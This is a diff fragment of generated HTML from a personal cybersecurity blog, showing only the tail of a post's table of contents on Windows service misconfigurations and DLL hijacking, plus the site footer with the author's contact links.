+            <li><a href="#step-1-2">Step 1.</a></li>
+            <li><a href="#step-2-2">Step 2.</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#insecure-service-executables">Insecure Service Executables</a>
+      <ul>
+        <li><a href="#steps-to-exploit-this-misconfiguration-2">Steps to exploit this misconfiguration:</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#step-1-3">Step 1.</a></li>
+              </ul>
+            </li>
+            <li><a href="#step-2-3">Step 2.</a>
+              <ul>
+                <li><a href="#step-3-2">Step 3.</a></li>
+              </ul>
+            </li>
+            <li><a href="#step-4-2">Step 4.</a>
+              <ul>
+                <li><a href="#step-5-2">Step 5.</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#dll-hijacking">DLL Hijacking</a></li>
+    <li><a href="#steps-to-exploit-this-misconfiguration-3">Steps to exploit this misconfiguration.</a>
+      <ul>
+        <li>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#step-1-4">Step 1.</a></li>
+                <li><a href="#step-2-4">Step 2.</a></li>
+                <li><a href="#step-3-3">Step 3.</a></li>
+                <li><a href="#step-4-3">Step 4.</a></li>
+                <li><a href="#step-5-3">Step 5.</a></li>
+                <li><a href="#step-6-1">Step 6.</a></li>
+                <li><a href="#step-7-1">Step 7.</a></li>
+                <li><a href="#step-8">Step 8.</a></li>
+                <li><a href="#step-9">Step 9.</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </div>
+    </div>
+    
+  </section>
+
+    </div>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+  
+
+  
+  
+    
+    
+      
+    
+  
+
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+
+  
+  
+  
+    
+  
+  
+
+  
+  
+  
+
+  <footer id="footer" class="container-fluid text-center align-content-center footer pb-2">
+    <div class="container pt-5">
+      <div class="row text-start">
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Navigation</h5>
+          
+          <ul>
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#about">About</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#skills">Skills</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#recent-posts">Recent Posts</a>
+                </li>
+              
+              
+                
+                
+                  
+                
+                <li class="nav-item">
+                  <a class="smooth-scroll" href="http://localhost:1313/#experiences">Experiences</a>
+                </li>
+              
+            
+              
+                
+              
+            
+          </ul>
+          
+        </div>
+        
+        
+        <div class="col-md-4 col-sm-12">
+          <h5>Contact me:</h5>
+          <ul>
+            
+              
+                <li><a href=mailto:jusnary1@gmail.com target="_blank" rel="noopener">
+                  <span><i class="fas fa-envelope"></i></span> <span>jusnary1@gmail.com</span>
+                </a></li>
+              
+            
+              
+                <li>
+                  
+                  <a href=https://www.linkedin.com/in/justus-juvenary target="_blank" rel="noopener">
+                    <span><i class=fab&#32;fa-linkedin></i></span> <span>Justus Juvenary</span>
+                  </a>
+                  
+                </li>
+              
+            
+          </ul>
+        </div>
+        
+        
+        
+      </div>
+    </div>
+    
+    
+    <hr />
+    <div class="container">
+      <div class="row text-start">
+        <div class="col-md-4">
+          <a id="theme" href="https://www.linkedin.com/in/justus-juvenary/" target="_blank" rel="noopener">
+            Justus Juvenary
+          </a>
+        </div>
+        <div class="col-md-4 text-center">© 2024 Copyright.</div>
+        <div class="col-md-4 text-end">
+          <a id="hugo" href="https://www.narycyber.com/" target="_blank" rel="noopener">
+            NaryCyber
+          </a>
+        </div>
+      </div>
+    </div>
+    
+  </footer>
+
+
+    <script src="/application.b91ad4f8dcfc23b15c9ba98e2b039a62fd05938843f9092a89760a31bc5b2cd4.js" integrity="sha256-uRrU&#43;Nz8I7Fcm6mOKwOaYv0Fk4hD&#43;QkqiXYKMbxbLNQ=" defer></script>
+
+
+    
+     
+
+    
+</body>
+</html>
